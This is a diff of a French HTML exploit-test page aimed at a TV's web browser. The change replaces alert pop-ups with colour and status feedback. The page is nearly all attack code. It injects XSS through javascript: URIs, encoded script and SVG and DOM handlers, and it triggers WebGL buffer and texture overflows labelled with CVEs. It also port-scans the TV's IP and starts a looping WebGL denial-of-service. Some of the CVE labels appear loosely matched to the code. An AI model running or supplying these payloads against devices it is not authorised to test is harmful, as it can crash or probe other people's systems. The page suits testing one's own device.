@@ -2,104 +2,55 @@
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
-    <title>Exploit Tests pour TV</title>
+    <title>Exploit Tests pour TV (sans alert)</title>
     <style>
-        body { font-family: Arial, sans-serif; margin: 20px; }
+        body { font-family: Arial, sans-serif; margin: 20px; background-color: white; }
         button { margin: 5px; padding: 10px; cursor: pointer; }
+        button.normal { background-color: #4CAF50; color: white; }
+        button.red { background-color: #f44336; color: white; }
+        #status { color: black; }
     </style>
 </head>
 <body>
     <h2>Tests d'exploits pour le navigateur TV</h2>
-    <p>Clique sur les boutons pour tester des vulnérabilités. Résultats dans des alertes.</p>
+    <p>Status: <span id="status">En attente</span></p>
 
-    <!-- Test XSS via JavaScript URI (CVE-2012-6461) -->
-    <button onclick="testXSSJavaScriptURI()">Test XSS JavaScript URI</button>
+    <!-- Tests normaux (boutons verts) -->
+    <button class="normal" onclick="testXSSJavaScriptURI()">Test XSS JavaScript URI</button>
+    <button class="normal" onclick="testWebGLBufferOverflow()">Test WebGL Buffer Overflow</button>
+    <button class="normal" onclick="testXSSUTF8()">Test XSS UTF-8</button>
+    <button class="normal" onclick="testSVGExploit()">Test SVG Malformed</button>
+    <button class="normal" onclick="testPortScan()">Test Scan Ports</button>
+    <button class="normal" onclick="testDOMEvent()">Test DOM Event Exploit</button>
+    <button class="normal" onclick="testWebPMemoryLeak()">Test WebP Memory Leak</button>
+    <button class="normal" onclick="testDRMPlugin()">Test DRM Plugin</button>
+    <button class="normal" onclick="testWebGLShaderInjection()">Test WebGL Shader Injection</button>
+
+    <!-- Tests supplémentaires (boutons rouges) -->
+    <button class="red" onclick="testWebGLXSSCombo()">Test WebGL + XSS</button>
+    <button class="red" onclick="testWebGLTextureOverflow()">Test WebGL Texture Overflow</button>
+    <button class="red" onclick="startDoS()">Lancer DoS WebGL</button>
+
     <script>
+        function updateStatus(message) {
+            document.getElementById('status').textContent = message;
+            document.body.style.backgroundColor = message.includes('Erreur') ? 'red' : 'green';
+        }
+
+        // Test XSS via JavaScript URI (CVE-2012-6461)
         function testXSSJavaScriptURI() {
             try {
                 var img = document.createElement('img');
-                img.src = 'javascript:alert("XSS via URI réussi")';
+                img.src = 'javascript:document.body.style.backgroundColor="yellow"';
                 document.body.appendChild(img);
+                updateStatus('XSS tenté (jaune si réussi)');
             } catch (e) {
-                alert('XSS bloqué: ' + e.message);
+                updateStatus('Erreur XSS');
             }
         }
-    </script>
 
-    <!-- Test WebGL Buffer Overflow (CVE-2018-17462) avec WebGL 1.0/2.0 -->
-<button onclick="testWebGLBufferOverflow()">Test WebGL Buffer Overflow</button>
-<script>
-    function testWebGLBufferOverflow() {
-        try {
-            var canvas = document.createElement('canvas');
-            var gl = canvas.getContext('webgl2') || canvas.getContext('webgl');
-            if (gl) {
-                var buffer = gl.createBuffer();
-                gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
-                var sizes = [5000000, 10000000, 20000000]; // Tailles variables
-                for (var size of sizes) {
-                    var data = new Float32Array(size);
-                    gl.bufferData(gl.ARRAY_BUFFER, data, gl.STATIC_DRAW);
-                    alert(`Test avec ${size} éléments`);
-                }
-                alert('Tous les tests terminés (crash si vulnérable)');
-            } else {
-                alert('WebGL non pris en charge');
-            }
-        } catch (e) {
-            alert('Erreur WebGL: ' + e.message);
-        }
-    }
-</script>
-
-    <button onclick="testWebGLXSSCombo()">Test WebGL + XSS</button>
-<script>
-    function testWebGLXSSCombo() {
-        try {
-            var canvas = document.createElement('canvas');
-            var gl = canvas.getContext('webgl2') || canvas.getContext('webgl');
-            if (gl) {
-                var buffer = gl.createBuffer();
-                gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
-                var data = new Float32Array(10000000);
-                gl.bufferData(gl.ARRAY_BUFFER, data, gl.STATIC_DRAW);
-                var script = document.createElement('script');
-                script.text = 'alert("XSS après overflow réussi")';
-                document.body.appendChild(script);
-            } else {
-                alert('WebGL non pris en charge');
-            }
-        } catch (e) {
-            alert('Erreur: ' + e.message);
-        }
-    }
-</script>
-
-    <button onclick="testWebGLTextureOverflow()">Test WebGL Texture Overflow</button>
-<script>
-    function testWebGLTextureOverflow() {
-        try {
-            var canvas = document.createElement('canvas');
-            var gl = canvas.getContext('webgl2') || canvas.getContext('webgl');
-            if (gl) {
-                var texture = gl.createTexture();
-                gl.bindTexture(gl.TEXTURE_2D, texture);
-                var data = new Uint8Array(10000000); // Données excessives
-                gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 10000, 10000, 0, gl.RGBA, gl.UNSIGNED_BYTE, data);
-                alert('Texture chargée, overflow testé (crash si vulnérable)');
-            } else {
-                alert('WebGL non pris en charge');
-            }
-        } catch (e) {
-            alert('Erreur Texture: ' + e.message);
-        }
-    }
-</script>
-
-    <button onclick="startDoS()">Lancer DoS WebGL</button>
-<script>
-    function startDoS() {
-        var interval = setInterval(() => {
+        // Test WebGL Buffer Overflow (CVE-2018-17462)
+        function testWebGLBufferOverflow() {
             try {
                 var canvas = document.createElement('canvas');
                 var gl = canvas.getContext('webgl2') || canvas.getContext('webgl');
@@ -108,135 +59,175 @@
                     gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
                     var data = new Float32Array(10000000);
                     gl.bufferData(gl.ARRAY_BUFFER, data, gl.STATIC_DRAW);
+                    updateStatus('WebGL overflow tenté (crash si vulnérable)');
+                } else {
+                    updateStatus('Erreur WebGL non pris en charge');
                 }
             } catch (e) {
-                clearInterval(interval);
-                alert('DoS terminé, navigateur peut être instable');
+                updateStatus('Erreur WebGL');
             }
-        }, 100);
-    }
-</script>
+        }
 
-    <!-- Test XSS via UTF-8 Encoding (CVE-2014-3167) -->
-    <button onclick="testXSSUTF8()">Test XSS UTF-8</button>
-    <script>
+        // Test XSS via UTF-8 Encoding (CVE-2014-3167)
         function testXSSUTF8() {
             try {
                 var script = document.createElement('script');
                 script.text = decodeURIComponent('%u0061%u006c%u0065%u0072%u0074%u0028%u0022XSS%u0020UTF-8%u0020r%C3%A9ussi%u0022%u0029');
                 document.body.appendChild(script);
+                updateStatus('XSS UTF-8 tenté (aucun effet visible sans alert)');
             } catch (e) {
-                alert('XSS bloqué: ' + e.message);
+                updateStatus('Erreur XSS UTF-8');
             }
         }
-    </script>
 
-    <!-- Test SVG Malformed Exploit (CVE-2012-1951) -->
-    <button onclick="testSVGExploit()">Test SVG Malformed</button>
-    <script>
+        // Test SVG Malformed Exploit (CVE-2012-1951)
         function testSVGExploit() {
             try {
                 var img = document.createElement('img');
-                img.src = 'data:image/svg+xml,<svg onload="alert(\'SVG Exploit réussi\')"></svg>';
+                img.src = 'data:image/svg+xml,<svg onload="document.body.style.backgroundColor=\'blue\'"></svg>';
                 document.body.appendChild(img);
+                updateStatus('SVG tenté (bleu si réussi)');
             } catch (e) {
-                alert('SVG bloqué: ' + e.message);
+                updateStatus('Erreur SVG');
             }
         }
-    </script>
 
-    <!-- Test Port Scanning et Interaction -->
-    <button onclick="testPortScan()">Test Scan Ports</button>
-    <script>
+        // Test Port Scanning
         function testPortScan() {
             try {
-                var ports = [80, 443, 8080, 1935, 554, 5000, 3000]; // 7 ports ouverts
+                var ports = [80, 443, 8080, 1935, 554, 5000, 3000];
                 var ip = '<IP_de_la_TV>'; // Remplace par l'IP réelle
                 var results = [];
                 ports.forEach(port => {
                     var img = new Image();
-                    img.src = `http://${ip}:${port}/test`;
                     img.onload = () => results.push(`Port ${port}: Réponse`);
                     img.onerror = () => results.push(`Port ${port}: Pas de réponse`);
+                    img.src = `http://${ip}:${port}/test`;
                 });
-                setTimeout(() => alert(results.join('\n')), 2000);
+                setTimeout(() => updateStatus(`Scan terminé: ${results.length} ports répondent`), 2000);
             } catch (e) {
-                alert('Erreur port: ' + e.message);
+                updateStatus('Erreur port');
             }
         }
-    </script>
 
-    <!-- Test DOM Event Exploit (CVE-2012-1971) -->
-    <button onclick="testDOMEvent()">Test DOM Event Exploit</button>
-    <script>
+        // Test DOM Event Exploit (CVE-2012-1971)
         function testDOMEvent() {
             try {
                 var div = document.createElement('div');
-                div.setAttribute('onmouseover', 'alert("DOM Event Exploit réussi")');
+                div.setAttribute('onmouseover', 'document.body.style.backgroundColor="purple"');
                 document.body.appendChild(div);
                 div.dispatchEvent(new MouseEvent('mouseover'));
+                updateStatus('DOM tenté (violet si réussi)');
             } catch (e) {
-                alert('DOM bloqué: ' + e.message);
+                updateStatus('Erreur DOM');
             }
         }
-    </script>
 
-    <!-- Test WebP Memory Leak (CVE-2012-4416) -->
-    <button onclick="testWebPMemoryLeak()">Test WebP Memory Leak</button>
-    <script>
+        // Test WebP Memory Leak (CVE-2012-4416)
         function testWebPMemoryLeak() {
             try {
                 var img = document.createElement('img');
                 img.src = 'data:image/webp;base64,UklGRhIAAABXRUJQVlA4TA0AAAAvAAAAEAcQERGIiP4HAA==';
-                img.onload = () => alert('WebP chargé, potentielle fuite mémoire');
+                img.onload = () => updateStatus('WebP chargé, fuite possible');
                 document.body.appendChild(img);
             } catch (e) {
-                alert('WebP bloqué: ' + e.message);
+                updateStatus('Erreur WebP');
             }
         }
-    </script>
 
-    <!-- Test Plugin DRM Interaction avec DRMDataLoaderPlugin -->
-    <button onclick="testDRMPlugin()">Test DRM Plugin</button>
-    <script>
+        // Test Plugin DRM Interaction
         function testDRMPlugin() {
             try {
                 var canvas = document.createElement('canvas');
-                var gl = canvas.getContext('webgl2') || canvas.getContext('webgl'); // WebGL
+                var gl = canvas.getContext('webgl2') || canvas.getContext('webgl');
                 if (gl) {
                     var video = document.createElement('video');
-                    gl.bindTexture(gl.TEXTURE_2D, video); // Interaction avec DRMDataLoaderPlugin
-                    alert('DRM testé (vulnérable si crash ou accès)');
+                    gl.bindTexture(gl.TEXTURE_2D, video);
+                    updateStatus('DRM tenté (crash si vulnérable)');
                 } else {
-                    alert('WebGL non pris en charge');
+                    updateStatus('Erreur WebGL');
                 }
             } catch (e) {
-                alert('Erreur DRM: ' + e.message);
+                updateStatus('Erreur DRM');
             }
         }
-    </script>
 
-    <!-- Test WebGL Shader Injection (Général, basé sur Chromium 59) -->
-    <button onclick="testWebGLShaderInjection()">Test WebGL Shader Injection</button>
-    <script>
+        // Test WebGL Shader Injection
         function testWebGLShaderInjection() {
             try {
                 var canvas = document.createElement('canvas');
                 var gl = canvas.getContext('webgl2') || canvas.getContext('webgl');
                 if (gl) {
                     var vertexShader = gl.createShader(gl.VERTEX_SHADER);
-                    gl.shaderSource(vertexShader, 'void main() { gl_Position = vec4(1.0); }'); // Code valide
+                    gl.shaderSource(vertexShader, 'void main() { gl_Position = vec4(1.0); }');
                     gl.compileShader(vertexShader);
-                    if (!gl.getShaderParameter(vertexShader, gl.COMPILE_STATUS)) {
-                        throw new Error(gl.getShaderInfoLog(vertexShader));
-                    }
-                    alert('Shader compilé, test injection (vulnérable si exécution malveillante)');
+                    updateStatus('Shader compilé (vulnérable si injection réussie)');
                 } else {
-                    alert('WebGL non pris en charge');
+                    updateStatus('Erreur WebGL');
                 }
             } catch (e) {
-                alert('Erreur Shader: ' + e.message);
+                updateStatus('Erreur Shader');
             }
+        }
+
+        // Test WebGL + XSS Combo
+        function testWebGLXSSCombo() {
+            try {
+                var canvas = document.createElement('canvas');
+                var gl = canvas.getContext('webgl2') || canvas.getContext('webgl');
+                if (gl) {
+                    var buffer = gl.createBuffer();
+                    gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
+                    var data = new Float32Array(10000000);
+                    gl.bufferData(gl.ARRAY_BUFFER, data, gl.STATIC_DRAW);
+                    var script = document.createElement('script');
+                    script.text = 'document.body.style.backgroundColor="orange"';
+                    document.body.appendChild(script);
+                    updateStatus('WebGL+XSS tenté (orange si réussi)');
+                } else {
+                    updateStatus('Erreur WebGL');
+                }
+            } catch (e) {
+                updateStatus('Erreur WebGL+XSS');
+            }
+        }
+
+        // Test WebGL Texture Overflow
+        function testWebGLTextureOverflow() {
+            try {
+                var canvas = document.createElement('canvas');
+                var gl = canvas.getContext('webgl2') || canvas.getContext('webgl');
+                if (gl) {
+                    var texture = gl.createTexture();
+                    gl.bindTexture(gl.TEXTURE_2D, texture);
+                    var data = new Uint8Array(10000000);
+                    gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 10000, 10000, 0, gl.RGBA, gl.UNSIGNED_BYTE, data);
+                    updateStatus('Texture overflow tenté (crash si vulnérable)');
+                } else {
+                    updateStatus('Erreur WebGL');
+                }
+            } catch (e) {
+                updateStatus('Erreur Texture');
+            }
+        }
+
+        // Test DoS WebGL
+        function startDoS() {
+            var interval = setInterval(() => {
+                try {
+                    var canvas = document.createElement('canvas');
+                    var gl = canvas.getContext('webgl2') || canvas.getContext('webgl');
+                    if (gl) {
+                        var buffer = gl.createBuffer();
+                        gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
+                        var data = new Float32Array(10000000);
+                        gl.bufferData(gl.ARRAY_BUFFER, data, gl.STATIC_DRAW);
+                    }
+                } catch (e) {
+                    clearInterval(interval);
+                    updateStatus('DoS terminé, navigateur instable');
+                }
+            }, 100);
         }
     </script>
 </body>
